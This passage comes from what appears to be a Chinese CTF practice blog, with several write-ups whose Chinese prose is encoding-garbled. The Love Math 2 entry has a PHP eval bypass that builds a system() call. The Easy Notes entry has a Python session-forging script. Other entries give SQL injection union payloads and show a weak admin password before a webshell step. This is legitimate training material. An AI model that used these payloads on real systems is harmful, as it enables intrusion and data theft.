punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç™½åå•åˆ¶ï¼Œç»™äº†å¾ˆå¤šæ•°å­¦å‡½æ•°ï¼Œæ€è·¯ç±»ä¼¼äºæ„é€ æ‰€ä»¥å¯ä»¥è€ƒè™‘ç”¨è¿™äº›æ•°å­¦å‡½æ•°é€šè¿‡<strong>å¼‚æˆ–</strong>/<strong>å–å</strong>æ¥æ„é€ æˆæƒ³è¦çš„å­—ç¬¦ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>(is_nan^(6).(4)).(tan^(1).(5))</code>ä¸º_GET</p><p><code>$pi=_GETï¼Œ$$pi=$_GET</code></p><p><code>$pi&#123;0&#125;($pi&#123;1&#125;)</code>å³<code>$_GET&#123;0&#125;($_GET&#123;1&#125;)</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹åˆ°evalå·²ç»é‡Œé¢çš„å­—ç¬¦ä¸²å¯æ§ï¼Œå°±åº”è¯¥æƒ³åˆ°åˆ†å·<code>;</code>é—´éš”æ‰§è¡Œå¤šä¸ªå‘½ä»¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token number">64</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token string single-quoted-string">'64'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'is_nan'</span> <span class="token operator">^</span> <span class="token string single-quoted-string">'6'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'4'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo is_nan^64;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo is_nan^'64';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20210902185216015.png"></p><p>éœ€è¦å­—ç¬¦ä¸²å¼‚æˆ–æ‰è¡Œï¼Œæ‰€ä»¥å°†æ•°å­—ä»¥æ‹¬å·åˆ†å‰²ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[HarekazeCTF2019]Easy Notes</title>
      <link href="/p/67449346.html"/>
      <url>/p/67449346.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ååºåˆ—åŒ–|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172314653.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>éœ€è¦è·å–adminæƒé™æ‹¿flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172357242.png"></p><p>ç„¶åç™»å½•ï¼Œå¯ä»¥å†™ä¸œè¥¿ï¼Œæ€€ç–‘æ˜¯XSS</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831172836634.png"></p><p>è½¬äº†ä¸€åœˆæ²¡å¤´ç»ªï¼ŒåŸæ¥ç»™äº†æºç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831173610225.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831173618790.png"></p><p>æ˜¾ç„¶ï¼Œæ˜¯è¦æ„é€ session</p><p>sessionè·¯å¾„æ˜¯åœ¨<strong>TEMP_DIR</strong>ä¸Š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831215026817.png"></p><p>è€Œè¿™ä¸ªä¹Ÿè¢«ç”¨æ¥åˆ›å»ºä¸´æ—¶çš„æ‰“åŒ…æ–‡ä»¶ï¼Œæ˜¾ç„¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ„é€ ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831215105843.png"></p><p>payload:</p><p>ç”¨æˆ·åä¸º<code>sess_</code></p><p>titleä¸º<code>|N;admin|b:1;</code></p><p>typeä¸º<code>.</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsURL <span class="token operator">=</span> <span class="token string">'http://9987cba0-7fe1-48b9-a969-6c429b9f6745.node4.buuoj.cn:81/'</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># login as sess_</span>    sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'login.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'sess_'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># make a crafted note</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'add.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'|N;admin|b:1;'</span><span class="token punctuation">,</span>        <span class="token string">'body'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># make a fake session</span>    r <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'export.php?type=.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    sessid <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'sess_([0-9a-z-]+)'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sessid<span class="token punctuation">)</span>    <span class="token comment"># get the flag</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL <span class="token operator">+</span> <span class="token string">'?page=flag'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'flag\&#123;.+\&#125;'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°æµ‹è¯•äº†ä¸‹ï¼Œæ–°å»ºçš„sessionæ ¼å¼æ˜¯</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210831230656058.png"></p><p>å…³äºsessionååºåˆ—åŒ–é—®é¢˜çœ‹<a href="https://syunaht.com/p/3063917200.html#toc-heading-5">åˆ·é¢˜ç¬”è®°:bestphpâ€™s revenge</a></p><p>å†™å…¥æ–‡ä»¶æ˜¯è¿™æ ·</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901004508966.png"></p><p>ç»è¿‡ååºåˆ—åŒ–åå†åºåˆ—åŒ–å˜è¿™æ ·</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901004523024.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Easy-Notes/image-20210901005442296.png"></p><p>å¤§è‡´æƒ³äº†ä¸€ä¸‹ï¼Œç±»ä¼¼è¿™ç§ååºåˆ—åŒ–é¢˜ï¼Œåº”è¯¥å¯ä»¥ç›´æ¥æ— è„‘<code>|N;</code>+æ„é€ å¥½çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:October 2019 Twice SQL Injection</title>
      <link href="/p/3288058269.html"/>
      <url>/p/3288058269.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[äºŒæ¬¡æ³¨å…¥]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-October-2019-Twice-SQL-Injection/image-20210830185028272.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿˜åœ¨changeé‚£é‡Œè¯•äº†åŠå¤©ï¼Œæ²¡æƒ³åˆ°æ³¨å…¥ç‚¹ç«Ÿç„¶åœ¨ç™»å½•ã€‚åº”è¯¥å¤šè¯•è¯•çš„å”‰ã€‚</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D;1&#39; union select database() #username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# username &#x3D;1&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ•°æ®åº“</p><pre class="line-numbers language-none"><code class="language-none">ctftraining<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¡¨</p><pre class="line-numbers language-none"><code class="language-none">flag,news,users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ—</p><pre class="line-numbers language-none"><code class="language-none">flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;934730c7-4ab2-406b-9c62-819bc6c4e1c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GKCTF 2021]easycms</title>
      <link href="/p/3674030718.html"/>
      <url>/p/3674030718.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æç¤ºï¼šåå°äº”ä½å¼±å£ä»¤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829195840158.png"></p><p>æœ‰ç§è«åçš„ç†Ÿæ‚‰æ„Ÿï¼Œæ€ä¹ˆæ„Ÿè§‰è¿™ä¸ªæ¯”èµ›æˆ‘å‚åŠ è¿‡ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿›/admin.phpï¼Œè¾“å…¥admin@12345ï¼Œè¿›å…¥åå°</p><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><p>è¿™ç§CMSï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°ä¸»é¢˜ã€‚</p><p>è¯•äº†ä¸‹ä¸»é¢˜å¯ä»¥å¯¼å‡ºï¼Œä¸»é¢˜è¿™é‡Œæƒ³å¯¼å…¥éœ€è¦åˆ›å»ºè¿™ä¸ªæ–‡ä»¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829200802221.png"></p><p>æ‰€ä»¥æ¥ä¸‹æ¥æƒ³æƒ³åŠæ³•åˆ›å»ºä¸‹è¿™ä¸ªæ–‡ä»¶ã€‚</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;qgak.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è®¾è®¡-ç»„ä»¶-ç´ æåº“é‡Œå¯ä»¥ä¸Šä¼ txtæ–‡ä»¶ç„¶åé‡å‘½å</p><p>è¿™æ ·ç«Ÿç„¶è¿˜ä¸è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829201527384.png"></p><p>å“¦ åŸæ¥å¯ä»¥ï¼Œå¤šæ‰“äº†ä¸ª.txt åˆ æ‰å°±å¥½</p><p>éƒ½ä¸éœ€è¦ä¸Šä¼ ä¸»é¢˜äº†ï¼Œç›´æ¥åœ¨é«˜çº§é‡Œæ”¹å°±å¥½ã€‚</p><p>åŠ ä¸ªé©¬</p><p><img 